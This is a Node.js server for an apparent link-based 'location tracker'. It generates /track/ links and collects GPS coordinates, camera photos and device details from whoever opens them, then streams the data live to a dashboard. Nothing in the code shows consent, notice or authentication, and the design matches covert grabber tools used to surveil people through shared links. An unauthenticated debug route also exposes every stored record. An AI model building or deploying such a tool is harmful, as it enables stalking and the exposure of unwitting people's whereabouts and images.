const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const { v4: uuidv4 } = require('uuid');
const path = require('path');
const cors = require('cors');
require('dotenv').config();

const app = express();
const server = http.createServer(app);
const io = new Server(server, {
  cors: { origin: '*' }
});

app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));
const { MongoClient } = require('mongodb');

// ── Database Layer ──────────────────────────────────────────
let db = null;
let dbFailed = false;
const MONGODB_URI = process.env.MONGODB_URI;
const DATABASE_NAME = 'location_tracker';

// Mock store for fallback
const mockStore = {
  trackers: [],
  sessions: [],
  locations: [],
  photos: []
};

async function connectDB() {
  if (db) return db;
  if (dbFailed || !MONGODB_URI) {
    db = createMockDB();
    return db;
  }
  try {
    const client = new MongoClient(MONGODB_URI, {
      connectTimeoutMS: 2000,
      serverSelectionTimeoutMS: 2000
    });
    await client.connect();
    db = client.db(DATABASE_NAME);
    console.log('✅ Connected to MongoDB Atlas');
    return db;
  } catch (err) {
    console.error('❌ MongoDB Connection Error:', err.message);
    dbFailed = true; // Stay in mock mode until next restart
    db = createMockDB();
    return db;
  }
}

function createMockDB() {
  const match = (item, query) => Object.entries(query).every(([k, v]) => item[k] === v);
  return {
    collection: (name) => ({
      find: (query = {}) => {
        let results = (mockStore[name] || []).filter(item => match(item, query));
        return {
          toArray: async () => [...results],
          limit: (n) => ({ toArray: async () => results.slice(0, n) })
        };
      },
      findOne: async (query) => (mockStore[name] || []).find(item => match(item, query)) || null,
      insertOne: async (doc) => { (mockStore[name] = mockStore[name] || []).push(doc); return { insertedId: doc.id }; },
      updateOne: async (query, update, options = {}) => {
        let store = (mockStore[name] = mockStore[name] || []);
        let doc = store.find(item => match(item, query));
        if (!doc && options.upsert) { doc = { ...query }; store.push(doc); }
        if (doc && update.$set) Object.assign(doc, update.$set);
        return { modifiedCount: 1, matchedCount: doc ? 1 : 0 };
      },
      deleteOne: async (query) => {
        const store = (mockStore[name] || []);
        const idx = store.findIndex(item => match(item, query));
        if (idx !== -1) store.splice(idx, 1);
        return { deletedCount: 1 };
      },
      deleteMany: async (query) => {
        mockStore[name] = (mockStore[name] || []).filter(item => !match(item, query));
        return { deletedCount: 1 };
      },
      countDocuments: async (query) => (mockStore[name] || []).filter(item => match(item, query)).length
    })
  };
}

async function getCollection(name) {
  const database = await connectDB();
  return database.collection(name);
}

// ── Unified Helpers ──────────────────────────────────────────

async function getTracker(id) {
  try {
    const col = await getCollection('trackers');
    return await col.findOne({ id });
  } catch (e) { return null; }
}

// Helper to check if a session is currently active (last update < 3 minutes ago)
function isSessionActive(session) {
  if (!session || !session.lastSeen) return false;
  return (new Date() - new Date(session.lastSeen)) < 180000;
}

async function updateTrackerLocation(trackerId, sessionId, entry) {
  try {
    const sCol = await getCollection('sessions');
    const lCol = await getCollection('locations');
    const tCol = await getCollection('trackers');
    
    // Update individual session
    await sCol.updateOne(
      { trackerId, sessionId },
      { $set: { lastLocation: entry, lastSeen: new Date().toISOString() } },
      { upsert: true }
    );

    // Update master tracker for dashboard overview
    await tCol.updateOne({ id: trackerId }, { $set: { lastLocation: entry, active: true } });

    await lCol.insertOne({ trackerId, sessionId, ...entry });
    io.to(`tracker:${trackerId}`).emit('location-received', { trackerId, sessionId, location: entry });
    return true;
  } catch (e) { return false; }
}

async function addPhoto(trackerId, sessionId, photo) {
  try {
    const pCol = await getCollection('photos');
    await pCol.insertOne({ trackerId, sessionId, ...photo });
    io.to(`tracker:${trackerId}`).emit('photo-received', { trackerId, sessionId, photo });
    return true;
  } catch (e) { return false; }
}

async function updateDeviceInfo(trackerId, sessionId, info) {
  try {
    const sCol = await getCollection('sessions');
    const tCol = await getCollection('trackers');
    await sCol.updateOne(
      { trackerId, sessionId },
      { $set: { deviceInfo: info, lastSeen: new Date().toISOString() } },
      { upsert: true }
    );
    await tCol.updateOne({ id: trackerId }, { $set: { active: true } });
    io.to(`tracker:${trackerId}`).emit('session-updated', { trackerId, sessionId, info });
    return true;
  } catch (e) { return false; }
}

// ── API Routes (Serverless Friendly) ──────────────────────────

app.get('/api/db-status', (req, res) => {
  res.json({ connected: !!db && !dbFailed, mode: dbFailed ? 'mock' : 'persistent', timestamp: new Date() });
});

app.get('/api/debug', (req, res) => {
  res.json({ mockStore, env: { hasUri: !!process.env.MONGODB_URI, port: process.env.PORT }, dbStatus: { failed: dbFailed, connected: !!db } });
});

app.post('/api/tracker/:id/location', async (req, res) => {
  try {
    const { sessionId, latitude, longitude, accuracy, altitude, speed, heading } = req.body;
    const entry = { latitude, longitude, accuracy, altitude, speed, heading, timestamp: new Date().toISOString() };
    const success = await updateTrackerLocation(req.params.id, sessionId || 'default', entry);
    res.json({ success });
  } catch (e) { res.status(500).json({ error: e.message }); }
});

app.post('/api/tracker/:id/photo', async (req, res) => {
  try {
    const { sessionId, image, facing } = req.body;
    const entry = { image, facing, timestamp: new Date().toISOString() };
    const success = await addPhoto(req.params.id, sessionId || 'default', entry);
    res.json({ success });
  } catch (e) { res.status(500).json({ error: e.message }); }
});

app.post('/api/tracker/:id/info', async (req, res) => {
  try {
    const { sessionId, info } = req.body;
    const success = await updateDeviceInfo(req.params.id, sessionId || 'default', info);
    res.json({ success });
  } catch (e) { res.status(500).json({ error: e.message }); }
});

// ── API Routes (Standard) ────────────────────────────────────

app.post('/api/tracker/create', async (req, res) => {
  try {
    const id = uuidv4().slice(0, 8);
    const tracker = { id, name: req.body.name || `Tracker ${id}`, createdAt: new Date().toISOString(), active: false, lastLocation: null };
    
    const col = await getCollection('trackers');
    await col.insertOne(tracker);
    
    // Fixed link generation for Vercel (prefer HTTPS)
    const host = req.get('host');
    const link = `${host.includes('localhost') ? 'http' : 'https'}://${host}/track/${id}`;
    
    res.json({ success: true, tracker, link });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

app.get('/api/trackers', async (req, res) => {
  try {
    const col = await getCollection('trackers');
    const sCol = await getCollection('sessions');
    const all = await col.find({}).toArray();
    for (const t of all) {
      const sessions = await sCol.find({ trackerId: t.id }).toArray();
      t.sessionCount = sessions.length;
      t.active = sessions.some(s => isSessionActive(s));
    }
    res.json(all);
  } catch (e) { res.status(500).json({ error: e.message }); }
});

app.get('/api/tracker/:id', async (req, res) => {
  try {
    const tracker = await getTracker(req.params.id);
    if (!tracker) return res.status(404).json({ error: 'Not found' });
    const sCol = await getCollection('sessions');
    const lCol = await getCollection('locations');
    const pCol = await getCollection('photos');
    const sessions = await sCol.find({ trackerId: req.params.id }).toArray();
    for (const s of sessions) s.active = isSessionActive(s);
    res.json({
      ...tracker,
      sessions,
      locations: await lCol.find({ trackerId: req.params.id }).limit(200).toArray(),
      photos: await pCol.find({ trackerId: req.params.id }).limit(100).toArray()
    });
  } catch (e) { res.status(500).json({ error: e.message }); }
});

app.delete('/api/tracker/:id', async (req, res) => {
  try {
    const id = req.params.id;
    const tCol = await getCollection('trackers');
    const sCol = await getCollection('sessions');
    const lCol = await getCollection('locations');
    const pCol = await getCollection('photos');

    await tCol.deleteOne({ id });
    await sCol.deleteMany({ trackerId: id });
    await lCol.deleteMany({ trackerId: id });
    await pCol.deleteMany({ trackerId: id });
    
    io.emit('tracker-deleted', id);
    res.json({ success: true });
  } catch (e) { res.status(500).json({ error: e.message }); }
});

// ── Socket.io (Hybrid) ──────────────────────────────────────

io.on('connection', (socket) => {
  socket.on('watch-tracker', (id) => socket.join(`tracker:${id}`));
  socket.on('join-tracker', (id) => socket.join(`tracker:${id}`));
  socket.on('location-update', async (d) => { try { await updateTrackerLocation(d.trackerId, d.sessionId || 'default', { ...d, timestamp: new Date() }); } catch(e){} });
  socket.on('photo-capture', async (d) => { try { await addPhoto(d.trackerId, d.sessionId || 'default', { ...d, timestamp: new Date() }); } catch(e){} });
  socket.on('device-info', async (d) => { try { await updateDeviceInfo(d.trackerId, d.sessionId || 'default', d.info); } catch(e){} });
});

// ── Track page route ────────────────────────────────────────
app.get('/track/:id', async (req, res) => {
  try {
    const tracker = await getTracker(req.params.id);
    if (!tracker) return res.status(404).sendFile(path.join(__dirname, 'public', '404.html'));
    
    // Auto-online on page load
    const tCol = await getCollection('trackers');
    await tCol.updateOne({ id: req.params.id }, { $set: { active: true } });
    
    res.sendFile(path.join(__dirname, 'public', 'track.html'));
  } catch (e) {
    res.status(500).send("Error loading track page");
  }
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
  console.log(`\n  🟢 Tracker running at http://localhost:${PORT}\n`);
});

module.exports = server;
